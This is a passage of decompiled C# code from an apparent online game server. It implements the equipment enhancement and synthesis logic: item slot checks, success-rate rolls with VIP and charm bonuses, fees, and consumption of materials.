												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
										}
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
								goto end_IL_10198;
								IL_1041c:
								HcItimesClass hcItimesClass43;
								if (hcItimesClass42.属性1.属性数量 + hcItimesClass42.属性2.属性数量 != 0 && hcItimesClass42.属性3.属性数量 + hcItimesClass42.属性4.属性数量 != 0 && BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 3 && !合成物品表.ContainsKey(4))
								{
									合成物品表.Add(4, hcItimesClass43);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
								goto end_IL_10198;
								IL_1030a:
								if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 800000006 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 800000060)
								{
									合成提示(num, 7, 0, 装备栏包裹[num2]);
								}
								else
								{
									hcItimesClass43 = new HcItimesClass();
									hcItimesClass43.位置 = num2;
									hcItimesClass43.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									if (!合成物品表.ContainsKey(2))
									{
										合成物品表.Add(2, hcItimesClass43);
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
									hcItimesClass42.得到属性();
									if (hcItimesClass42.属性1.属性数量 + hcItimesClass42.属性2.属性数量 == 0)
									{
										goto IL_1041c;
									}
									if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 2)
									{
										if (!合成物品表.ContainsKey(3))
										{
											合成物品表.Add(3, hcItimesClass43);
											合成提示(num, 1, 0, 装备栏包裹[num2]);
										}
										goto IL_1041c;
									}
								}
								end_IL_10198:;
							}
							catch (Exception ex38)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex38.Message);
							}
							goto default;
						case 13:
						case 243:
							try
							{
								if (base.当前操作类型 == 8 || base.当前操作类型 == 209)
								{
									if (合成物品表.Count == 0)
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else if (!合成物品表.ContainsKey(5))
									{
										HcItimesClass hcItimesClass41 = new HcItimesClass();
										hcItimesClass41.位置 = num2;
										hcItimesClass41.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(5, hcItimesClass41);
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex37)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex37.Message);
							}
							goto default;
						case 10:
						case 244:
							try
							{
								HcItimesClass hcItimesClass36;
								HcItimesClass hcItimesClass37;
								HcItimesClass hcItimesClass38;
								HcItimesClass hcItimesClass39;
								HcItimesClass hcItimesClass40;
								ItmeClass value34;
								if (合成物品表.Count > 0 && (base.当前操作类型 == 8 || base.当前操作类型 == 209))
								{
									hcItimesClass36 = null;
									hcItimesClass37 = null;
									hcItimesClass38 = null;
									hcItimesClass39 = null;
									hcItimesClass40 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass36 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass37 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(3))
									{
										hcItimesClass38 = 合成物品表[3];
									}
									if (合成物品表.ContainsKey(4))
									{
										hcItimesClass39 = 合成物品表[4];
									}
									if (合成物品表.ContainsKey(5))
									{
										hcItimesClass40 = 合成物品表[5];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass36.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass36.物品全局ID, 0))
									{
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
										合成物品表.Clear();
									}
									else if (hcItimesClass37 == null)
									{
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
										合成物品表.Clear();
									}
									else if (hcItimesClass37 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass37.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass37.物品全局ID, 0))
									{
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass37.位置]);
										合成物品表.Clear();
									}
									else if (hcItimesClass38 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass38.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass38.物品全局ID, 0))
									{
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass38.位置]);
										合成物品表.Clear();
									}
									else if (hcItimesClass39 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass39.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass39.物品全局ID, 0))
									{
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass39.位置]);
										合成物品表.Clear();
									}
									else if (hcItimesClass40 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass40.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass40.物品全局ID, 0))
									{
										合成提示(num, 2, 0, 装备栏包裹[hcItimesClass40.位置]);
										合成物品表.Clear();
									}
									else
									{
										hcItimesClass36.得到属性();
										hcItimesClass36.强化属性阶段();
										if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass36.物品id, 0), out value34))
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
											合成物品表.Clear();
										}
										else if (value34.FLD_RESIDE2 != 1 && value34.FLD_RESIDE2 != 2 && value34.FLD_RESIDE2 != 4 && value34.FLD_RESIDE2 != 5 && value34.FLD_RESIDE2 != 6 && value34.FLD_RESIDE2 != 14 && value34.FLD_RESIDE2 != 23 && value34.FLD_RESIDE2 != 24 && value34.FLD_RESIDE2 != 25)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
											合成物品表.Clear();
										}
										else if (装备栏包裹[hcItimesClass36.位置].物品绑定)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
											合成物品表.Clear();
										}
										else if (hcItimesClass36.强化数量 >= 15)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
											合成物品表.Clear();
										}
										else if (value34.FLD_LEVEL >= 130)
										{
											if (hcItimesClass37 != null && BitConverter.ToInt32(hcItimesClass37.物品id, 0) != 800000060)
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
												合成物品表.Clear();
											}
											else if (hcItimesClass38 != null && BitConverter.ToInt32(hcItimesClass38.物品id, 0) != 800000060)
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
												合成物品表.Clear();
											}
											else
											{
												if (hcItimesClass39 == null || BitConverter.ToInt32(hcItimesClass39.物品id, 0) == 800000060)
												{
													goto IL_10b5b;
												}
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
												合成物品表.Clear();
											}
										}
										else if (hcItimesClass37 != null && BitConverter.ToInt32(hcItimesClass37.物品id, 0) != 800000006)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
											合成物品表.Clear();
										}
										else if (hcItimesClass38 != null && BitConverter.ToInt32(hcItimesClass38.物品id, 0) != 800000006)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
											合成物品表.Clear();
										}
										else
										{
											if (hcItimesClass39 == null || BitConverter.ToInt32(hcItimesClass39.物品id, 0) == 800000006)
											{
												goto IL_10b5b;
											}
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass36.位置]);
											合成物品表.Clear();
										}
									}
								}
								goto end_IL_105fa;
								IL_10b5b:
								if (合成手续费 <= 0)
								{
									goto IL_10bb5;
								}
								if (base.Player_Money >= 合成手续费)
								{
									base.Player_Money -= 合成手续费;
									更新金钱和负重();
									goto IL_10bb5;
								}
								合成提示(11, 4, 0, 装备栏包裹[hcItimesClass36.位置]);
								合成物品表.Clear();
								goto end_IL_105fa;
								IL_10bb5:
								double num32 = RNG.Next(1, 100);
								if (hcItimesClass40 != null)
								{
									num32 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass40.物品id, 0));
								}
								if (元宝合成开关 == 1)
								{
									num32 += 5.0;
								}
								if (base.FLD_VIP == 1)
								{
									num32 += 100.0 * World.VIP合成率增加百分比;
								}
								if (World.强化率 != 0.0)
								{
									num32 += 100.0 * World.强化率;
								}
								if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
								{
									num32 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
								}
								if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
								{
									num32 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
								}
								if (hcItimesClass36.属性1.属性数量 + hcItimesClass36.属性2.属性数量 != 0 && hcItimesClass38 == null)
								{
									系统提示("石头数量不足,最少需要2颗强化石。");
								}
								else if (hcItimesClass36.属性1.属性数量 + hcItimesClass36.属性2.属性数量 != 0 && hcItimesClass36.属性3.属性数量 + hcItimesClass36.属性4.属性数量 != 0 && hcItimesClass39 == null)
								{
									系统提示("石头数量不足,最少需要3颗强化石。");
								}
								else
								{
									if ((hcItimesClass36.强化数量 == 0 && !(num32 < 100.0 - World.强化一合成率)) || (hcItimesClass36.强化数量 == 1 && !(num32 < 100.0 - World.强化二合成率)) || (hcItimesClass36.强化数量 == 2 && !(num32 < 100.0 - World.强化三合成率)) || (hcItimesClass36.强化数量 == 3 && !(num32 < 100.0 - World.强化四合成率)) || (hcItimesClass36.强化数量 == 4 && !(num32 < 100.0 - World.强化五合成率)) || (hcItimesClass36.强化数量 == 5 && !(num32 < 100.0 - World.强化六合成率)) || (hcItimesClass36.强化数量 == 6 && !(num32 < 100.0 - World.强化七合成率)) || (hcItimesClass36.强化数量 == 7 && !(num32 < 100.0 - World.强化八合成率)) || (hcItimesClass36.强化数量 == 8 && !(num32 < 100.0 - World.强化九合成率)) || (hcItimesClass36.强化数量 == 9 && !(num32 < 100.0 - World.强化十合成率)) || (hcItimesClass36.强化数量 == 10 && !(num32 < 100.0 - World.强化十一合成率)) || (hcItimesClass36.强化数量 == 11 && !(num32 < 100.0 - World.强化十二合成率)) || (hcItimesClass36.强化数量 == 12 && !(num32 < 100.0 - World.强化十三合成率)) || (hcItimesClass36.强化数量 == 13 && !(num32 < 100.0 - World.强化十四合成率)) || (hcItimesClass36.强化数量 == 14 && num32 >= 100.0 - World.强化十五合成率))
									{
										hcItimesClass36.强化类型 = ((value34.FLD_RESIDE2 == 4) ? 1 : 2);
										int num9 = ++hcItimesClass36.强化数量;
										if (hcItimesClass36.强化数量 >= 15)
										{
											hcItimesClass36.强化数量 = 15;
										}
										hcItimesClass36.设置阶段属性();
										if (hcItimesClass36.强化数量 >= 8)
										{
											发送快报(base.UserName, hcItimesClass36.强化数量, hcItimesClass36.物品id, base.Player_Zx);
										}
										if (BitConverter.ToInt32(装备栏包裹[hcItimesClass36.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass36.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass36.物品全局ID, 0))
										{
											减去物品(hcItimesClass36.位置, 1);
											增加物品(hcItimesClass36.物品全局ID, hcItimesClass36.物品id, hcItimesClass36.位置, hcItimesClass36.物品数量, hcItimesClass36.物品属性);
										}
										装备栏包裹[hcItimesClass36.位置].锁定 = false;
										RxjhClass.合成记录(base.Userid, base.UserName, value34.ItmeNAME, num, "强化", "成功", 装备栏包裹[hcItimesClass36.位置]);
										合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass36.位置]);
									}
									else
									{
										if (value34.FLD_RESIDE2 != 1 && value34.FLD_RESIDE2 != 2 && value34.FLD_RESIDE2 != 5 && value34.FLD_RESIDE2 != 6)
										{
											if (value34.FLD_RESIDE2 == 4)
											{
												int num33 = 得到包裹空位(this);
												if (num33 != -1)
												{
													switch (value34.FLD_JOB_LEVEL)
													{
													case 2:
													{
														int value42 = RNG.Next(7, 12);
														增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000729), num33, BitConverter.GetBytes(value42), new byte[56]);
														break;
													}
													case 3:
													{
														int value41 = RNG.Next(7, 11);
														增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000730), num33, BitConverter.GetBytes(value41), new byte[56]);
														break;
													}
													case 4:
													{
														int value40 = RNG.Next(7, 11);
														增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000731), num33, BitConverter.GetBytes(value40), new byte[56]);
														break;
													}
													case 5:
													{
														int value39 = RNG.Next(7, 11);
														增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000732), num33, BitConverter.GetBytes(value39), new byte[56]);
														break;
													}
													case 6:
													{
														int value38 = RNG.Next(7, 11);
														增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000759), num33, BitConverter.GetBytes(value38), new byte[56]);
														break;
													}
													case 7:
													{
														int value37 = RNG.Next(7, 11);
														增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000760), num33, BitConverter.GetBytes(value37), new byte[56]);
														break;
													}
													case 8:
													{
														int value36 = RNG.Next(7, 11);
														增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000761), num33, BitConverter.GetBytes(value36), new byte[56]);
														break;
													}
													case 9:
													{
														int value35 = RNG.Next(7, 11);
														增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000762), num33, BitConverter.GetBytes(value35), new byte[56]);
														break;
													}
													}
												}
											}
										}
										else
										{
											int value43 = RNG.Next(7, 10);
											int num34 = 得到包裹空位(this);
											if (num34 != -1)
											{
												if (value34.FLD_LEVEL >= 140 && value34.FLD_LEVEL < 150)
												{
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000766), num34, BitConverter.GetBytes(value43), new byte[56]);
												}
												else if (value34.FLD_LEVEL >= 130 && value34.FLD_LEVEL < 140)
												{
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000765), num34, BitConverter.GetBytes(value43), new byte[56]);
												}
												else if (value34.FLD_LEVEL >= 120 && value34.FLD_LEVEL < 130)
												{
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000764), num34, BitConverter.GetBytes(value43), new byte[56]);
												}
												else if (value34.FLD_LEVEL >= 115 && value34.FLD_LEVEL < 120)
												{
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000763), num34, BitConverter.GetBytes(value43), new byte[56]);
												}
												else if (value34.FLD_LEVEL >= 100 && value34.FLD_LEVEL < 115)
												{
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000744), num34, BitConverter.GetBytes(value43), new byte[56]);
												}
												else if (value34.FLD_LEVEL >= 80 && value34.FLD_LEVEL < 99)
												{
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000743), num34, BitConverter.GetBytes(value43), new byte[56]);
												}
												else if (value34.FLD_LEVEL >= 60 && value34.FLD_LEVEL < 79)
												{
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000742), num34, BitConverter.GetBytes(value43), new byte[56]);
												}
												else if (value34.FLD_LEVEL >= 40 && value34.FLD_LEVEL < 59)
												{
													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000741), num34, BitConverter.GetBytes(value43), new byte[56]);
												}
											}
										}
										合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass36.位置]);
										RxjhClass.合成记录(base.Userid, base.UserName, value34.ItmeNAME, num, "强化", "失败", 装备栏包裹[hcItimesClass36.位置]);
										减去物品(hcItimesClass36.位置, 1);
									}
									减去物品(hcItimesClass37.位置, 1);
									if (hcItimesClass38 != null)
									{
										减去物品(hcItimesClass38.位置, 1);
									}
									if (hcItimesClass39 != null)
									{
										减去物品(hcItimesClass39.位置, 1);
									}
									if (hcItimesClass40 != null)
									{
										减去物品(hcItimesClass40.位置, 1);
									}
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
									合成手续费 = 0;
								}
								end_IL_105fa:;
							}
							catch (Exception ex36)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化合成 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex36.Message);
							}
							goto default;
						case 120:
							if (base.当前操作类型 == 37)
							{
								int num13 = 封包数据[14];
								int num14 = 封包数据[26];
								if (装备栏包裹[num13].Get物品ID != 0L && 装备栏包裹[num14].Get物品ID != 0L)
								{
									ItmeClass value11;
									if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num13].物品ID, 0), out value11))
									{
										合成提示(num, 0, 0, 装备栏包裹[num13]);
									}
									else if (value11.FLD_RESIDE2 != 12)
									{
										合成提示(num, 0, 0, 装备栏包裹[num13]);
									}
									else if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num14].物品ID, 0), out value11))
									{
										合成提示(num, 0, 0, 装备栏包裹[num14]);
									}
									else if (value11.FLD_RESIDE2 != 14)
									{
										合成提示(num, 0, 0, 装备栏包裹[num13]);
									}
									else if (!装备栏包裹[num13].物品绑定 && !装备栏包裹[num14].物品绑定)
									{
										if (装备栏包裹[num13].FLD_MAGIC1 != 0 && 装备栏包裹[num13].FLD_MAGIC2 != 0 && 装备栏包裹[num13].FLD_MAGIC3 != 0 && 装备栏包裹[num13].FLD_MAGIC4 != 0)
										{
											if (装备栏包裹[num14].FLD_MAGIC1 == 0 && 装备栏包裹[num14].FLD_MAGIC2 == 0 && 装备栏包裹[num14].FLD_MAGIC3 == 0 && 装备栏包裹[num14].FLD_MAGIC4 == 0)
											{
												int num15 = 得到包裹空位位置();
												if (num15 == -1)
												{
													系统提示("背包没有空位了。");
												}
												else
												{
													byte[] array4 = new byte[56];
													System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array4, 0, 4);
													System.Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num13].FLD_MAGIC1), 0, array4, 4, 4);
													System.Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num13].FLD_MAGIC2), 0, array4, 8, 4);
													System.Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num13].FLD_MAGIC3), 0, array4, 12, 4);
													System.Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num13].FLD_MAGIC4), 0, array4, 16, 4);
													增加物品(装备栏包裹[num14].物品全局ID, BitConverter.GetBytes(装备栏包裹[num14].Get物品ID), num15, BitConverter.GetBytes(1), array4);
													减去物品(num13, 1);
													减去物品(num14, 1);
													合成提示(num, 1, 0, 装备栏包裹[num14]);
												}
											}
											else
											{
												合成提示(num, 0, 0, 装备栏包裹[num13]);
											}
										}
										else
										{
											合成提示(num, 0, 0, 装备栏包裹[num13]);
										}
									}
									else
									{
										合成提示(num, 0, 0, 装备栏包裹[num13]);
									}
								}
								else
								{
									合成提示(num, 2, 0, 装备栏包裹[num13]);
								}
							}
							goto default;
						case 319:
							try
							{
								HcItimesClass value10;
								if (合成物品表.TryGetValue(1, out value10))
								{
									装备栏包裹[value10.位置].锁定 = false;
									合成物品表.Clear();
									合成系统解锁();
								}
								元宝合成开关 = 0;
								打开仓库中 = false;
								合成提示(num, 0, 0, 装备栏包裹[num2]);
							}
							catch (Exception ex13)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 披风分解取消 210 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex13.Message);
							}
							break;
						case 299:
							try
							{
								HcItimesClass value9;
								if (合成物品表.TryGetValue(1, out value9))
								{
									装备栏包裹[value9.位置].锁定 = false;
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
							}
							catch (Exception ex12)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex12.Message);
							}
							goto default;
						case 300:
							try
							{
								if (base.当前操作类型 == 300 && 合成物品表.Count > 0)
								{
									if (base.Player_Money < 10000000L)
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else
									{
										base.Player_Money -= 10000000L;
										更新金钱和负重();
										HcItimesClass hcItimesClass8 = null;
										HcItimesClass hcItimesClass9 = null;
										if (合成物品表.ContainsKey(1))
										{
											hcItimesClass8 = 合成物品表[1];
										}
										if (合成物品表.ContainsKey(2))
										{
											hcItimesClass9 = 合成物品表[2];
										}
										ItmeClass value8;
										if (BitConverter.ToInt64(装备栏包裹[hcItimesClass8.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass8.物品全局ID, 0) && (hcItimesClass9 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass9.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass9.物品全局ID, 0)) && World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass8.物品id, 0), out value8) && (value8.FLD_RESIDE2 == 1 || value8.FLD_RESIDE2 == 4) && !装备栏包裹[hcItimesClass8.位置].物品绑定)
										{
											byte[] array3 = new byte[4];
											System.Buffer.BlockCopy(封包数据, 14, array3, 0, 4);
											int num10 = BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array3, 0)].物品ID, 0);
											if (num10 != 0)
											{
												double num11 = RNG.Next(1, 100);
												double num12 = 10.0;
												if (hcItimesClass9 != null)
												{
													num11 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass9.物品id, 0));
												}
												if (元宝合成开关 == 1)
												{
													num11 += 5.0;
												}
												if (base.FLD_VIP == 1)
												{
													num11 += World.VIP合成率增加百分比;
												}
												if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
												{
													num11 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
												}
												if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
												{
													num11 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
												}
												if (num11 >= num12)
												{
													int fLD_FJ_四神之力 = 0;
													switch (num10)
													{
													case 1000001122:
														fLD_FJ_四神之力 = 1;
														break;
													case 1000001123:
														fLD_FJ_四神之力 = 2;
														break;
													case 1000001124:
														fLD_FJ_四神之力 = 3;
														break;
													case 1000001125:
														fLD_FJ_四神之力 = 4;
														break;
													}
													hcItimesClass8.FLD_FJ_四神之力 = fLD_FJ_四神之力;
													合成提示(num, 1, 10000000, 装备栏包裹[hcItimesClass8.位置]);
													RxjhClass.合成记录(base.Userid, base.UserName, value8.ItmeNAME, num, "四神之力", "成功", 装备栏包裹[hcItimesClass8.位置]);
												}
												else
												{
													合成提示(num, 6, 0, 装备栏包裹[hcItimesClass8.位置]);
													RxjhClass.合成记录(base.Userid, base.UserName, value8.ItmeNAME, num, "四神之力", "失败", 装备栏包裹[hcItimesClass8.位置]);
												}
												if (hcItimesClass9 != null)
												{
													减去物品(hcItimesClass9.位置, 1);
												}
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass8.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass8.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass8.物品全局ID, 0))
												{
													减去物品(hcItimesClass8.位置, 1);
													增加物品(hcItimesClass8.物品全局ID, hcItimesClass8.物品id, hcItimesClass8.位置, hcItimesClass8.物品数量, hcItimesClass8.物品属性);
												}
												装备栏包裹[hcItimesClass8.位置].锁定 = false;
												减去物品(BitConverter.ToInt32(array3, 0), 1);
												合成物品表.Clear();
												合成系统解锁();
												元宝合成开关 = 0;
												打开仓库中 = false;
											}
										}
									}
								}
							}
							catch (Exception ex11)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex11.Message);
							}
							goto default;
						case 301:
							try
							{
								if (base.当前操作类型 == 300 && !合成物品表.ContainsKey(1) && !装备栏包裹[num2].锁定 && !装备栏包裹[num2].物品绑定)
								{
									ItmeClass value7;
									if (base.Player_Money < 10000000L)
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else if (装备栏包裹[num2].FLD_FJ_觉醒 == 0)
									{
										合成提示(num, 4, 0, 装备栏包裹[num2]);
									}
									else if (装备栏包裹[num2].FLD_FJ_四神之力 != 0)
									{
										合成提示(num, 7, 0, 装备栏包裹[num2]);
									}
									else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value7) && (value7.FLD_RESIDE2 == 1 || value7.FLD_RESIDE2 == 4))
									{
										HcItimesClass hcItimesClass7 = new HcItimesClass();
										hcItimesClass7.位置 = num2;
										hcItimesClass7.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, hcItimesClass7);
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex10)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex10.Message);
							}
							goto default;
						case 302:
							if (base.当前操作类型 == 300)
							{
								int num9 = BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0);
								if ((uint)(num9 - 1000001122) <= 3u)
								{
									if (合成物品表.Count != 0)
									{
										合成物品表.Clear();
									}
									合成提示(num, 1, 0, 装备栏包裹[num2]);
									装备栏包裹[num2].锁定 = true;
									打开仓库中 = true;
								}
								break;
							}
							goto default;
						case 303:
							try
							{
								if (base.当前操作类型 == 300 && 合成物品表 != null && 合成物品表.Count != 0 && 合成物品表.ContainsKey(1) && !合成物品表.ContainsKey(2))
								{
									合成物品表.Add(2, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex6)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex6.Message);
							}
							goto default;
						case 309:
							try
							{
								元宝合成开关 = 0;
								打开仓库中 = false;
								合成物品表.Clear();
								System.Buffer.BlockCopy(array2, 0, array, 11, 2);
								合成系统解锁();
							}
							catch (Exception ex5)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 再造合成石-取消 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex5.Message);
								return;
							}
							goto default;
						case 310:
							try
							{
								HcItimesClass hcItimesClass4;
								int 位置2;
								int fLD_PID2;
								if (合成物品表.Count < 1)
								{
									合成提示(num, 2, 0, 装备栏包裹[num2]);
								}
								else if (装备栏包裹[num3].Get物品ID != 0L && 装备栏包裹[num3].Get物品ID == 1008001753L)
								{
									hcItimesClass4 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass4 = 合成物品表[1];
									}
									位置2 = hcItimesClass4.位置;
									int key = BitConverter.ToInt32(装备栏包裹[位置2].物品ID, 0);
									ItmeClass value4;
									if (World.Itme.TryGetValue(key, out value4))
									{
										if (value4.FLD_RESIDE2 != 7 && value4.FLD_RESIDE2 != 8 && value4.FLD_RESIDE2 != 10)
										{
											合成提示(num, 2, 0, 装备栏包裹[num2]);
										}
										else if (value4.ItmeNAME.Contains("梅柳真"))
										{
											ItmeClass itme5 = ItmeClass.GetItme(value4.ItmeNAME.Replace("（梅柳真）", ""));
											ItmeClass itme6 = ItmeClass.GetItme(value4.ItmeNAME.Replace("-魔（梅柳真）", ""));
											if (itme5 != null)
											{
												fLD_PID2 = itme5.FLD_PID;
												goto IL_124f5;
											}
											if (itme6 != null)
											{
												fLD_PID2 = itme6.FLD_PID;
												goto IL_124f5;
											}
										}
										else
										{
											ItmeClass itme7 = ItmeClass.GetItme(value4.ItmeNAME + "（梅柳真）");
											ItmeClass itme8 = ItmeClass.GetItme(value4.ItmeNAME + "-魔（梅柳真）");
											if (itme7 != null)
											{
												fLD_PID2 = itme7.FLD_PID;
												goto IL_124f5;
											}
											if (itme8 != null)
											{
												fLD_PID2 = itme8.FLD_PID;
												goto IL_124f5;
											}
										}
									}
								}
								goto end_IL_12319;
								IL_124f5:
								int fLD_MAGIC6 = 装备栏包裹[hcItimesClass4.位置].FLD_MAGIC0;
								int fLD_MAGIC7 = 装备栏包裹[hcItimesClass4.位置].FLD_MAGIC1;
								int fLD_MAGIC8 = 装备栏包裹[hcItimesClass4.位置].FLD_MAGIC2;
								int fLD_MAGIC9 = 装备栏包裹[hcItimesClass4.位置].FLD_MAGIC3;
								int fLD_MAGIC10 = 装备栏包裹[hcItimesClass4.位置].FLD_MAGIC4;
								减去物品(num3, 1);
								减去物品(位置2, 1);
								int 绑定2 = 0;
								if (装备栏包裹[hcItimesClass4.位置].物品绑定)
								{
									绑定2 = 1;
								}
								增加物品带属性(fLD_PID2, 位置2, 1, fLD_MAGIC6, fLD_MAGIC7, fLD_MAGIC8, fLD_MAGIC9, fLD_MAGIC10, 0, 0, 0, 绑定2, 0);
								合成物品表.Clear();
								合成系统解锁();
								打开仓库中 = false;
								元宝合成开关 = 0;
								合成提示(num, 1, 0, 装备栏包裹[hcItimesClass4.位置]);
								end_IL_12319:;
							}
							catch (Exception ex4)
							{
								Form1.WriteLine(1, "组合错误![" + base.Userid + "]-[" + base.UserName + "]" + ex4.Message);
							}
							break;
						case 311:
							try
							{
								int fLD_PID;
